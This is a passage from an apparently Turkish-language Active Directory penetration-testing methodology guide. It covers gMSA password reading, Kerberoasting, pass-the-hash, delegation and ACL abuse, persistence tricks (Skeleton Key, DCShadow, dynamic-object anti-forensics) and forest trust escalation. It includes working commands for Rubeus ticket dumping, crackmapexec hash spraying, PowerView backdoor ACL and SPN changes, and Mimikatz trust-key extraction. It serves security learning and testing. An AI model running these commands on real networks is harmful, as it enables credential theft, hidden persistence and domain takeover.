Başarısız bir varsayılan/NTLM bind işlemi bu bulguyu **geçersiz kılmaz**: `-k` seçeneğiyle, DC'ye çözümlenen bir FQDN kullanarak ve KDC ile eşitlenmiş bir saatle test edin. Başarılı modül çalıştırmaları, aday listelerini ve edinilen ccache'leri `~/.nxc/modules/pre2k/` altına yazar.<sup>[[18]](#references)[[20]](#references)</sup>

Computer principal'ı ele geçirdikten sonra, iç içe grup üyeliklerini ve giden haklarını grafiğe dökün. Özellikle, bir gMSA'nın `msDS-GroupMSAMembership` security descriptor'ında adı geçen principal'lar `msDS-ManagedPassword` değerini okuyabilir; NetExec'in `--gmsa` çıktısı, izin verilen principal'ları gösterir ve kimlik doğrulaması yapan computer yetkili olduğunda mevcut NT hash'i döndürür.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Ardından elde edilen gMSA'yı diğer kimlik bilgileri gibi değerlendirin: pass-the-hash denemeden önce yerel/etki alanı grup üyeliklerini, oturum açma haklarını, SPN'leri, delegation'ı ve erişilebilir hizmetleri inceleyin. ACL tabanlı bu erişim yolu, KDS root-key ihlalinden sonra yönetilen parolaları türeten [Golden gMSA/dMSA](golden-dmsa-gmsa.md) yönteminden farklıdır.<sup>[[20]](#references)</sup>

Bir bilgisayar principal'ı, diğer bilgisayar nesneleri veya grupları üzerinde giden denetime de sahip olabilir. Böyle bir principal elde ettikten sonra iç içe üyeliklerini ve etkin ACL'lerini ayrı ayrı inceleyin: başka bir bilgisayar nesnesi üzerindeki yazma hakkı hesap değişikliğine olanak sağlayabilir; grup üyeliği hakları ise oturum açma rolü kazandırabilir. Aşamalı hesap bayrağı, öngörülebilir adlandırma kuralı veya tek başına bir `GenericWrite` bağlantısı, yolun tamamını kanıtlamaz.

Bir dosyada, paylaşımda veya yedekte bulunan `msDS-ManagedPassword` blob'unun okunabilir bir kopyası ayrı bir açığa çıkma yoludur: LDAP okuma ACL'si başka yerde depolanan bir kopyayı koruyamaz. Yorumlamadan önce verinin gerçekten yönetilen parola blob'u olduğunu doğrulayın ve bunu hem yetkili LDAP okumasından hem de KDS root-key türetmesinden ayırın.

### Kerberoast

Kerberoasting, kullanıcı hesaplarına bağlı hizmetler tarafından kullanılan **TGS tickets**'ların elde edilmesini ve şifrelemelerinin (kullanıcı parolalarına dayalıdır) **offline** olarak kırılmasını içerir.

Bu konuda daha fazla bilgi:


{{#ref}}
kerberoast.md
{{#endref}}

### Uzak bağlantı (RDP, SSH, FTP, Win-RM vb.)

Bazı kimlik bilgilerini elde ettikten sonra herhangi bir **makineye** erişiminiz olup olmadığını kontrol edebilirsiniz. Bunun için, port taramalarınıza göre farklı protokoller kullanarak birkaç sunucuya bağlanmayı denemek üzere **CrackMapExec** kullanabilirsiniz.

### Local Privilege Escalation

Kimlik bilgilerini ele geçirdiyseniz veya normal bir etki alanı kullanıcısı olarak oturumunuz varsa ve etki alanındaki **herhangi bir makineye** erişebiliyorsanız, **yerel olarak ayrıcalıkları yükseltip kimlik bilgilerini toplamak** için bir yol arayın. Yerel yönetici ayrıcalıkları, bellekteki (LSASS) ve yerel depolamadaki (SAM) **diğer kullanıcıların hash'lerini dump etmenize** olanak sağlayabilir.

Bu kitapta [**Windows'ta yerel ayrıcalık yükseltme**](../windows-local-privilege-escalation/index.html) hakkında tam bir sayfa ve bir [**checklist**](../checklist-windows-privilege-escalation.md) bulunuyor. Ayrıca [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kullanmayı da unutmayın.

### Geçerli oturum biletleri

Geçerli kullanıcının beklenmedik kaynaklara **erişim izni veren** **ticket**'lara sahip olma olasılığı **çok düşüktür**, ancak şunları kontrol edebilirsiniz:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

Etki alanı kimlik bilgileriyle veya bir kullanıcı oturumuyla, NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) konusunu yeniden inceleyin: kimliği doğrulanmış enumeration ve coercion teknikleri, kimlik doğrulamasız keşif sırasında kullanılamayan relay yollarını ortaya çıkarabilir.

### Bilgisayar Paylaşımlarında Kimlik Bilgisi Arama | SMB Paylaşımları

Artık bazı temel kimlik bilgilerine sahip olduğunuza göre, **AD içinde paylaşılan** ilgi çekici **dosyalar bulup bulamayacağınızı** kontrol etmelisiniz. Bunu manuel olarak yapabilirsiniz, ancak bu çok sıkıcı ve tekrarlayan bir iştir (özellikle kontrol etmeniz gereken yüzlerce belge bulursanız).

[**Kullanabileceğiniz araçları öğrenmek için bu bağlantıyı izleyin.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### NTLM Kimlik Bilgilerini Çalma

Diğer **bilgisayarlara veya paylaşımlara erişebiliyorsanız**, bir şekilde erişildiğinde size karşı bir NTLM kimlik doğrulaması **tetikleyerek** **NTLM challenge** değerini ele geçirip kırabilmenizi sağlayacak SCF dosyası gibi **dosyalar yerleştirebilirsiniz**:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Bu güvenlik açığı, kimliği doğrulanmış herhangi bir kullanıcının **etki alanı denetleyicisini ele geçirmesine** olanak tanıyordu.


{{#ref}}
printnightmare.md
{{#endref}}

## Ayrıcalıklı kimlik bilgileri/oturumla Active Directory'de ayrıcalık yükseltme

**Aşağıdaki teknikler için sıradan bir etki alanı kullanıcısı yeterli değildir; bu saldırıları gerçekleştirmek için bazı özel ayrıcalıklara/kimlik bilgilerine ihtiyacınız vardır.**

### Hash çıkarma

Umarız [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), relay içeren [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md) veya [yerel olarak ayrıcalık yükseltme](../windows-local-privilege-escalation/index.html) yöntemlerini kullanarak bir **yerel admin** hesabını ele geçirmeyi başarmışsınızdır.\
Şimdi bellekteki ve yerel tüm hash'leri dökme zamanı.\
[**Hash'leri elde etmenin farklı yolları için bu sayfayı okuyun.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Bir kullanıcının hash'ini elde ettiğinizde**, onu **taklit etmek** için kullanabilirsiniz.\
Bu hash'i **kullanarak NTLM kimlik doğrulaması gerçekleştiren** bir **araç** kullanmanız gerekir; **ya da** yeni bir **sessionlogon** oluşturup bu **hash'i LSASS içine enjekte edebilirsiniz**. Böylece herhangi bir **NTLM kimlik doğrulaması gerçekleştirildiğinde** bu **hash kullanılır.** Mimikatz son seçeneği uygular.\
[**Daha fazla bilgi için bu sayfayı okuyun.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Bu saldırı, yaygın Pass The Hash yönteminin NTLM protokolü üzerinden kullanılmasına alternatif olarak **kullanıcının NTLM hash'ini Kerberos ticket'ları istemek için kullanmayı** amaçlar. Bu nedenle, özellikle **NTLM protokolünün devre dışı olduğu** ve kimlik doğrulama protokolü olarak yalnızca **Kerberos'a izin verilen** ağlarda kullanışlı olabilir.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

**Pass The Ticket (PTT)** saldırı yönteminde saldırganlar, kullanıcının parolasını veya hash değerlerini değil, **kimlik doğrulama ticket'ını çalar**. Ardından bu çalıntı ticket'ı **kullanıcıyı taklit etmek** ve ağ içindeki kaynaklara ve hizmetlere yetkisiz erişim elde etmek için kullanırlar.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Kimlik Bilgilerini Yeniden Kullanma

Bir **yerel yöneticiye** ait **hash'e** veya **parolaya** sahipseniz, bunları kullanarak diğer **bilgisayarlara** yerel olarak **giriş yapmayı** denemelisiniz.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Bunun oldukça **gürültülü** olduğunu ve **LAPS**'ın bunu **önleyebileceğini** unutmayın.

### MSSQL Abuse & Trusted Links

Bir kullanıcının **MSSQL instance'larına erişme** ayrıcalıkları varsa, MSSQL host'unda (SA olarak çalışıyorsa) **komut çalıştırabilir**, NetNTLM **hash**'ini **çalabilir** ve hatta bir **relay** **attack** gerçekleştirebilir.\
Bir MSSQL instance'ı başka bir instance tarafından veritabanı bağlantısı üzerinden güvenilir kabul ediliyorsa, bağlantılı veritabanında ayrıcalıkları olan bir kullanıcı **güven ilişkisini kullanarak diğer instance üzerinde sorgular çalıştırabilir**. Bu güven ilişkileri zincirlenebilir ve sonunda kullanıcının komut çalıştırabileceği yanlış yapılandırılmış bir veritabanına ulaşabilir.\
**Veritabanları arasındaki bağlantılar forest trust'ları üzerinden de çalışır.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT asset/deployment platforms abuse

Üçüncü taraf envanter ve dağıtım paketleri, genellikle kimlik bilgilerine ve kod çalıştırmaya yönelik güçlü yollar sunar. Şunlara bakın:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

[ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) özniteliğine sahip bir Computer nesnesi bulursanız ve bilgisayarda domain ayrıcalıklarınız varsa, bilgisayarda oturum açan tüm kullanıcıların TGT'lerini bellekten dökebilirsiniz.\
Dolayısıyla, **bir Domain Admin bilgisayarda oturum açarsa**, TGT'sini dökebilir ve [Pass the Ticket](pass-the-ticket.md) kullanarak onu taklit edebilirsiniz.\
Constrained delegation sayesinde **bir Print Server'ı otomatik olarak ele geçirebilirsiniz** (umarız bu bir DC olur).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

Bir kullanıcı veya bilgisayar "Constrained Delegation" için yetkilendirilmişse, **bir bilgisayardaki bazı hizmetlere erişmek için herhangi bir kullanıcıyı taklit edebilir**.\
Ardından, bu kullanıcının/bilgisayarın **hash'ini ele geçirirseniz**, bazı hizmetlere erişmek için **herhangi bir kullanıcıyı** (domain admin'ler dahil) **taklit edebilirsiniz**.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

Uzak bir bilgisayarın Active Directory nesnesi üzerinde **WRITE** ayrıcalığına sahip olmak, **yükseltilmiş ayrıcalıklarla** kod çalıştırmayı mümkün kılar:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

Ele geçirilen kullanıcının, **bazı domain nesneleri üzerinde ilginç ayrıcalıkları** olabilir; bunlar daha sonra yanal olarak **ilerlemenizi**/**ayrıcalıklarınızı yükseltmenizi** sağlayabilir.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

Domain içinde **dinleyen bir Spool hizmeti** keşfedilirse, yeni **kimlik bilgileri elde etmek** ve **ayrıcalıkları yükseltmek** için bu hizmetten **yararlanılabilir**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

**Diğer kullanıcılar** **ele geçirilen** makineye **erişiyorsa**, bellekten **kimlik bilgileri toplamak** ve hatta onları taklit etmek için süreçlerine **beacon enjekte etmek** mümkündür.\
Kullanıcılar genellikle sisteme RDP üzerinden erişir; bu nedenle üçüncü taraf RDP oturumlarına yönelik birkaç attack'ın nasıl gerçekleştirileceğini burada bulabilirsiniz:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS**, domain'e katılmış bilgisayarlardaki **yerel Administrator parolasını** yönetmek için bir sistem sağlar ve parolanın **rastgele**, benzersiz ve sık sık **değiştirilmesini** garanti eder. Bu parolalar Active Directory'de saklanır ve erişim, ACL'ler aracılığıyla yalnızca yetkili kullanıcılarla sınırlandırılır. Bu parolalara erişmek için yeterli ayrıcalıklarınız varsa, diğer bilgisayarlara geçiş yapabilirsiniz.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

AD CS kaydı, certificate mapping ve certificate theft veya template abuse öncesinde yapılacak enumeration hakkında bilgi için [AD Certificates overview](ad-certificates.md) sayfasına bakın.

Ele geçirilen makineden **sertifikaları toplamak**, ortam içindeki ayrıcalıkları yükseltmenin bir yolu olabilir:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

**Savunmasız template'ler** yapılandırılmışsa, ayrıcalıkları yükseltmek için bunlardan yararlanmak mümkündür:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Yüksek ayrıcalıklı hesapla post-exploitation

### Domain kimlik bilgilerini dökme

**Domain Admin** veya daha iyisi **Enterprise Admin** ayrıcalıklarını elde ettiğinizde, **domain veritabanını** (_ntds.dit_) **dökebilirsiniz**.

[**DCSync attack hakkında daha fazla bilgiyi burada bulabilirsiniz**](dcsync.md).

[**NTDS.dit dosyasının nasıl çalınacağı hakkında daha fazla bilgiyi burada bulabilirsiniz**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

`ntds.dit` dosyasını `SYSTEM` hive'ıyla birlikte içeren, okunabilir bir yedekleme arşivi, içeriği çıkarılmadan önce bile açığa çıkmış directory materyali olarak değerlendirilmelidir. Eski bir parola hash'i, diğer nesne özniteliklerini güvenli hâle getirmez: `description` gibi alanlarda kimlik bilgileri veya operasyonel notlar bulunabilir. Önce arşiv üyelerinin adlarını inceleyin ve çıkarılan veritabanı içeriklerini rutin enumeration çıktılarından uzak tutun.

### Persistence için Privesc

Daha önce ele alınan bazı teknikler persistence için kullanılabilir.\
Örneğin şunları yapabilirsiniz:

- Kullanıcıları [**Kerberoast**](kerberoast.md) saldırısına açık hâle getirmek

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Kullanıcıları [**ASREPRoast**](asreproast.md) saldırısına karşı savunmasız hâle getirin

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Kullanıcıya [**DCSync**](#dcsync) ayrıcalıkları veringer

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

**Silver Ticket attack**, belirli bir hizmet için **NTLM hash**'ini (örneğin **PC hesabının hash**'ini) kullanarak **geçerli bir Ticket Granting Service (TGS) ticket** oluşturur. Bu yöntem, **hizmet ayrıcalıklarına erişmek** için kullanılır.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack**, saldırganın Active Directory (AD) ortamında **krbtgt hesabının NTLM hash**'ini ele geçirmesini içerir. Bu hesap özeldir; çünkü AD ağında kimlik doğrulama için gerekli olan tüm **Ticket Granting Ticket (TGT)**'leri imzalamak için kullanılır.

Saldırgan bu hash'i ele geçirdikten sonra, istediği herhangi bir hesap için **TGT** oluşturabilir (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Bunlar, **yaygın Golden Ticket tespit mekanizmalarını atlatacak** şekilde oluşturulan Golden Ticket'lara benzer.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

Bir hesabın **sertifikalarına sahip olmak veya bunları talep edebilmek**, kullanıcı hesabında kalıcılık sağlamak için çok iyi bir yöntemdir (kullanıcı parolasını değiştirse bile):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Sertifikalar kullanarak** etki alanında yüksek ayrıcalıklarla kalıcılık sağlamak da mümkündür:


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory'deki **AdminSDHolder** nesnesi, yetkisiz değişiklikleri önlemek için **ayrıcalıklı gruplara** (Domain Admins ve Enterprise Admins gibi) standart bir **Access Control List (ACL)** uygulayarak bu grupların güvenliğini sağlar. Ancak bu özellik kötüye kullanılabilir: Saldırgan, sıradan bir kullanıcıya tam erişim verecek şekilde AdminSDHolder'ın ACL'sini değiştirirse, bu kullanıcı tüm ayrıcalıklı gruplar üzerinde kapsamlı denetim elde eder. Böylece koruma amacı taşıyan bu güvenlik önlemi, yakından izlenmediğinde istenmeyen erişime yol açabilir.

[**AdminDSHolder Group hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Her **Domain Controller (DC)** içinde bir **yerel yönetici** hesabı bulunur. Böyle bir makinede yönetici hakları elde edilirse, yerel Administrator hash'i **mimikatz** kullanılarak çıkarılabilir. Ardından, **bu parolanın kullanımını etkinleştirmek** için kayıt defterinde değişiklik yapılması gerekir; böylece yerel Administrator hesabına uzaktan erişim sağlanabilir.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Kullanıcıya belirli etki alanı nesneleri üzerinde **özel izinler verebilir**, böylece kullanıcının **ileride ayrıcalıklarını yükseltmesini** sağlayabilirsiniz.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**Security descriptor**'lar, bir **nesnenin** başka bir **nesne üzerindeki** **izinlerini** depolamak için kullanılır. Bir nesnenin **security descriptor**'ında yalnızca **küçük bir değişiklik** yaparak, ayrıcalıklı bir grubun üyesi olmanız gerekmeden o nesne üzerinde çok önemli ayrıcalıklar elde edebilirsiniz.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

`dynamicObject` yardımcı sınıfını kötüye kullanarak `entryTTL`/`msDS-Entry-Time-To-Die` ile kısa ömürlü principal'lar/GPO'lar/DNS kayıtları oluşturun. Bunlar tombstone bırakmadan kendilerini siler, böylece LDAP kanıtlarını ortadan kaldırırken orphan SID'ler, bozuk `gPLink` başvuruları veya önbelleğe alınmış DNS yanıtları bırakır (ör. AdminSDHolder ACE kirliliği ya da kötü amaçlı `gPCFileSysPath`/AD-integrated DNS yönlendirmeleri).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

**Evrensel bir parola** oluşturmak için bellekteki **LSASS**'ı değiştirerek tüm etki alanı hesaplarına erişim sağlayın.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[SSP'nin (Security Support Provider) ne olduğunu buradan öğrenin.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Makineye erişmek için kullanılan **kimlik bilgilerini** **açık metin olarak yakalamak** amacıyla **kendi SSP**'nizi oluşturabilirsiniz.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

AD'ye **yeni bir Domain Controller** kaydeder ve belirtilen nesnelerdeki öznitelikleri (SIDHistory, SPN'ler...) **değişikliklerle ilgili hiçbir günlük bırakmadan** göndermek için kullanır. **DA** ayrıcalıklarına sahip olmanız ve **root domain** içinde bulunmanız gerekir.\
Yanlış veri kullanırsanız oldukça çirkin günlüklerin oluşacağını unutmayın.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Daha önce **LAPS parolalarını okuyacak yeterli izne** sahipseniz ayrıcalıklarınızı nasıl yükseltebileceğinizi ele almıştık. Ancak bu parolalar **kalıcılığı sürdürmek** için de kullanılabilir.\
Şuraya bakın:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft, **Forest**'ı güvenlik sınırı olarak kabul eder. Bu, **tek bir etki alanının ele geçirilmesinin tüm Forest'ın ele geçirilmesine yol açabileceği** anlamına gelir.<sup>[[1]](#references)</sup>

### Basic Information

[**Domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>), bir **etki alanındaki** kullanıcının başka bir **etki alanındaki** kaynaklara erişmesini sağlayan bir güvenlik mekanizmasıdır. Temelde, iki etki alanının kimlik doğrulama sistemleri arasında bağlantı kurarak kimlik doğrulama denetimlerinin sorunsuz şekilde yapılmasını sağlar. Etki alanları trust kurduğunda, trust'ın bütünlüğü açısından kritik olan belirli **key**'leri kendi **Domain Controller (DC)**'ları arasında paylaşır ve saklar.

Tipik bir senaryoda, kullanıcı **trusted domain** içindeki bir hizmete erişmek istiyorsa önce kendi etki alanının DC'sinden **inter-realm TGT** olarak bilinen özel bir ticket talep etmelidir. Bu TGT, her iki etki alanının da üzerinde uzlaştığı ortak bir **key** ile şifrelenir. Ardından kullanıcı, bir hizmet ticket'ı (**TGS**) almak için bu TGT'yi **trusted domain'in DC**'sine sunar. Trusted domain'in DC'si inter-realm TGT'yi başarıyla doğruladığında, kullanıcıya hizmete erişim sağlayan bir TGS verir.

**Adımlar**:

1. **Domain 1** içindeki bir **client computer**, **NTLM hash**'ini kullanarak **Domain Controller'ından (DC1)** bir **Ticket Granting Ticket (TGT)** talep ederek süreci başlatır.
2. İstemcinin kimliği başarıyla doğrulanırsa DC1 yeni bir TGT verir.
3. Ardından istemci, **Domain 2** içindeki kaynaklara erişmek için gereken bir **inter-realm TGT**'yi DC1'den talep eder.
4. Inter-realm TGT, iki yönlü etki alanı trust'ının parçası olarak DC1 ile DC2 arasında paylaşılan bir **trust key** ile şifrelenir.
5. İstemci, inter-realm TGT'yi **Domain 2'nin Domain Controller'ına (DC2)** götürür.
6. DC2, paylaşılan trust key'i kullanarak inter-realm TGT'yi doğrular ve geçerliyse istemcinin erişmek istediği Domain 2 sunucusu için bir **Ticket Granting Service (TGS)** verir.
7. Son olarak istemci, hizmete erişmek için bu TGS'yi sunucuya sunar. TGS, sunucunun hesap hash'iyle şifrelenmiştir.

### Different trusts

Bir trust'ın **tek yönlü veya iki yönlü olabileceğini** unutmamak önemlidir. İki yönlü seçeneklerde her iki etki alanı da birbirine güvenir; **tek yönlü** trust ilişkisinde ise etki alanlarından biri **trusted**, diğeri **trusting** olur. Bu durumda, **yalnızca trusted domain'den trusting domain içindeki kaynaklara erişebilirsiniz**.

Domain A, Domain B'ye güveniyorsa A, trusting domain; B ise trusted domain'dir. Ayrıca **Domain A**'da bu bir **Outbound trust**; **Domain B**'de ise bir **Inbound trust** olur.

**Farklı trust ilişkileri**

- **Parent-Child Trusts**: Aynı forest içindeki yaygın bir yapılandırmadır. Child domain, parent domain ile otomatik olarak iki yönlü ve geçişli bir trust kurar. Bu, kimlik doğrulama isteklerinin parent ile child arasında sorunsuzca akabileceği anlamına gelir.
- **Cross-link Trusts**: "Shortcut trusts" olarak da bilinir ve yönlendirme süreçlerini hızlandırmak için child domain'ler arasında kurulur. Karmaşık forest'larda kimlik doğrulama yönlendirmeleri genellikle forest root'a kadar çıkıp ardından hedef etki alanına iner. Cross-link oluşturarak bu yol kısaltılır; bu, özellikle coğrafi olarak dağınık ortamlarda faydalıdır.
- **External Trusts**: Farklı ve ilişkisiz etki alanları arasında kurulur ve doğası gereği geçişli değildir. [Microsoft'un belgelerine](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) göre external trust'lar, forest trust ile bağlı olmayan mevcut forest dışındaki bir etki alanındaki kaynaklara erişmek için kullanışlıdır. External trust'larda SID filtering ile güvenlik güçlendirilir.
- **Tree-root Trusts**: Forest root domain ile yeni eklenen bir tree root arasında otomatik olarak kurulur. Yaygın olmasa da forest'a yeni domain tree'leri eklemek için önemlidir; bu sayede yeni ağaçlar benzersiz bir etki alanı adını koruyabilir ve iki yönlü geçişlilik sağlanır. Daha fazla bilgiye [Microsoft'un kılavuzundan](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) ulaşabilirsiniz.
- **Forest Trusts**: İki forest root domain arasında kurulan iki yönlü ve geçişli bir trust türüdür; güvenliği artırmak için SID filtering de uygular.
- **MIT Trusts**: Windows dışı, [RFC4120 uyumlu](https://tools.ietf.org/html/rfc4120) Kerberos etki alanlarıyla kurulur. MIT trust'lar daha özelleşmiştir ve Windows ekosistemi dışındaki Kerberos tabanlı sistemlerle entegrasyon gerektiren ortamlar için uygundur.

#### **Trusting relationships** arasındaki diğer farklar

- Trust ilişkisi **geçişli** (A, B'ye güvenir; B, C'ye güvenir; dolayısıyla A, C'ye güvenir) veya **geçişsiz** olabilir.
- Trust ilişkisi **çift yönlü trust** (taraflar birbirine güvenir) ya da **tek yönlü trust** (taraflardan yalnızca biri diğerine güvenir) olarak kurulabilir.

### Attack Path

1. Trust ilişkilerini **numaralandırın**.
2. Herhangi bir **security principal**'ın (kullanıcı/grup/bilgisayar) diğer etki alanındaki kaynaklara **erişimi** olup olmadığını kontrol edin. Bu erişim ACE girdileri aracılığıyla veya diğer etki alanının gruplarında yer almasıyla sağlanıyor olabilir. **Etki alanları arasındaki ilişkilere** bakın (muhtemelen trust bu nedenle oluşturulmuştur).
   1. Bu durumda kerberoast da başka bir seçenek olabilir.
3. Etki alanları arasında **pivot** yapabilen **hesapları ele geçirin**.

Başka bir etki alanındaki kaynaklara erişebilen saldırganlar, bunu üç temel mekanizma üzerinden gerçekleştirebilir:

- **Local Group Membership**: Principal'lar, sunucudaki "Administrators" grubu gibi makinelerdeki yerel gruplara eklenerek o makine üzerinde kapsamlı denetim elde edebilir.
- **Foreign Domain Group Membership**: Principal'lar, yabancı etki alanındaki grupların da üyesi olabilir. Ancak bu yöntemin ne kadar etkili olduğu trust'ın türüne ve grubun kapsamına bağlıdır.
- **Access Control Lists (ACLs)**: Principal'lar, bir **ACL** içinde, özellikle bir **DACL**'deki **ACE** öğelerinde tanımlanarak belirli kaynaklara erişim elde edebilir. ACL, DACL ve ACE işleyişini daha yakından incelemek isteyenler için “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” başlıklı whitepaper değerli bir kaynaktır.<sup>[[17]](#references)</sup>

### Find external users/groups with permissions

Etki alanındaki yabancı security principal'ları bulmak için **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** konumunu kontrol edebilirsiniz. Bunlar **harici bir etki alanındaki/forest'taki** kullanıcılar/gruplardır.

Bunu **Bloodhound** veya powerview kullanarak kontrol edebilirsiniz:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Etki alanı güven ilişkilerini listelemenin diğer yolları:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> **2 güvenilen anahtar** vardır; biri _Alt etki alanı --> Üst etki alanı_, diğeri ise _Üst etki alanı_ --> _Alt etki alanı_ içindir.\
> Mevcut etki alanının kullandığı anahtarı şu komutla bulabilirsiniz:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

SID-History injection kullanarak trust ilişkisinden yararlanıp child/parent domain üzerinde Enterprise admin yetkilerine yükselin:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Configuration Naming Context'in (NC) nasıl exploit edilebileceğini anlamak kritik önem taşır. Configuration NC, Active Directory (AD) ortamlarında bir forest genelindeki yapılandırma verileri için merkezi bir depo görevi görür. Bu veriler forest içindeki her Domain Controller'a (DC) replike edilir ve writeable DC'ler Configuration NC'nin yazılabilir bir kopyasını tutar. Bunu exploit etmek için bir DC'de, tercihen bir child DC'de **SYSTEM privileges** sahibi olmak gerekir.

**GPO'yu root DC sitesine bağlama**

Configuration NC'nin Sites container'ı, AD forest içindeki domain'e katılmış tüm bilgisayarların siteleri hakkında bilgi içerir. Herhangi bir DC'de SYSTEM privileges ile çalışan saldırganlar, GPO'ları root DC sitelerine bağlayabilir. Bu işlem, bu sitelere uygulanan politikaları değiştirerek root domain'i potansiyel olarak tehlikeye atabilir.

Ayrıntılı bilgi için [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4) araştırması incelenebilir.<sup>[[12]](#references)</sup>

**Forest'taki herhangi bir gMSA'yı ele geçirme**

Bir saldırı yöntemi, domain içindeki ayrıcalıklı gMSA'ları hedef almayı içerir. gMSA parolalarını hesaplamak için gereken KDS Root key, Configuration NC içinde saklanır. Herhangi bir DC'de SYSTEM privileges sahibi olmak, KDS Root key'e erişmeyi ve forest genelindeki herhangi bir gMSA'nın parolalarını hesaplamayı mümkün kılar.

Ayrıntılı analiz ve adım adım yönergeler şurada bulunabilir:


{{#ref}}
